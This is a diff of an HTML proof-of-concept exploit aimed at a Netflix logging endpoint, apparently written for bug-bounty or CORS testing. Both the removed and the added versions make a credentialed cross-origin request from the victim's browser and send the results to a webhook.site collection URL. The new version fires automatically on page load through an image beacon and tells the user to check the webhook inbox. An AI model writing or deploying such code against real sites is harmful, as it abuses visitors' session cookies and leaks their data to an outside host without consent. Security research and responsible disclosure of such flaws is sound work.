@@ -1,54 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>Netflix CORS PoC – credentialed data exfil</title>
-<style>
- body{font-family:monospace;background:#111;color:#eee;padding:2rem}
- button{padding:.5rem 1rem;font-size:1rem;cursor:pointer}
- pre{background:#222;border-radius:6px;padding:1rem;max-height:420px;overflow:auto}
-</style>
-</head>
-<body>
-<h2>Netflix CORS PoC – <code>/log/www/cl/2</code></h2>
-
-<button onclick="exploit()">Run exploit & exfiltrate</button>
-<pre id="out">Click the button…</pre>
-
+<html><body>
 <script>
-/*  ============== CONFIG ==============  */
-const TARGET  = 'https://logs.netflix.com/log/www/cl/2';
-const EXFIL   = 'https://webhook.site/4e1148e7-6ade-4b05-86c9-fd4e86d6e8be?data=';   
-/*  =====================================  */
+(async () => {
+  /* 1) Victim request ------------------------------------------- */
+  const target = 'https://logs.netflix.com/log/www/cl/2?dummy=1';
+  const res    = await fetch(target, { credentials:'include' });
 
-async function exploit(){
-  const out = document.getElementById('out');
-  out.textContent='⏳ Sending credentialed request…';
+  /* 2) Build a minimal leak object ------------------------------ */
+  const leak = {
+    status : res.status        // always readable
+    // you could add a timestamp or fixed string for clarity
+  };
 
-  try{
-    /* ---- 1. fetch victim data cross‑origin with cookies ---- */
-    const victimRes = await fetch(TARGET + '?dummy=1', {
-      method:'GET',
-      credentials:'include',   // ← sends SecureNetflixId, NetflixId, etc.
-      mode:'cors'
-    });
-
-    const body = await victimRes.text();    // body may be empty
-    /* ---- 2. exfiltrate status + headers + body to attacker ---- */
-    const leak = {
-      status     : victimRes.status,
-      nfstatus   : victimRes.headers.get('x-netflix.nfstatus'),
-      traceId    : victimRes.headers.get('x-b3-traceid'),
-      body
-    };
-
-    await fetch(EXFIL + encodeURIComponent(JSON.stringify(leak)));
-
-    out.textContent = '✅ Exfil sent! Data:\n' + JSON.stringify(leak,null,2);
-  }catch(e){
-    out.textContent='❌ Error:\n'+e;
-  }
-}
+  /* 3) Fire‑and‑forget exfil via <img>, no CORS, no header reads */
+  const exfil  = 'https://webhook.site/4e1148e7-6ade-4b05-86c9-fd4e86d6e8be?d=';
+  (new Image()).src = exfil + encodeURIComponent(JSON.stringify(leak));
+})();
 </script>
-</body>
-</html>
+<h3>PoC executed – check your Webhook inbox.</h3>
+</body></html>
